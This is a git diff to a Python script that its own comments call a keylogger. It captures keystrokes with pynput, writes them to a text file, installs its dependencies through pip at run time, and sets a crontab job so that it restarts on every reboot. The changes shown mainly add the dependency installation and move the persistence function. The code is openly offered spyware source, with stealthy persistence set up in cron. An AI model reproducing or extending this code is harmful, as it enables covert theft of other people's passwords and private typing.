@@ -1,6 +1,13 @@
 #Import Key and Listener module
+import subprocess
+import sys
+
+subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+subprocess.check_call([sys.executable, "-m", "pip", "install", "python-crontab"])
+
 from pynput.keyboard import Key, Listener
 from crontab import CronTab
+
 
 print('''________                 __  .__              __                 __    
 \______ \   ____ _____ _/  |_|  |__   _______/  |________  ____ |  | __\_____  \ 
@@ -33,11 +40,6 @@ def on_press(key):
     #Resets keys
     keys = []
     
-def cron():
-    my_cron = CronTab(user=True)
-    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
-    job.every_reboot()
-    my_cron.write()
     
 #write to a file
 #text file can be named how you see fit
@@ -51,7 +53,13 @@ def write_file(key):
 def on_release(key):
   if key==Key.esc:
     return my_bool
-  
+      
+def cron():
+    my_cron = CronTab(user=True)
+    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
+    job.every_reboot()
+    my_cron.write()
+
 cron()
     
 #Will continously loop through until broken
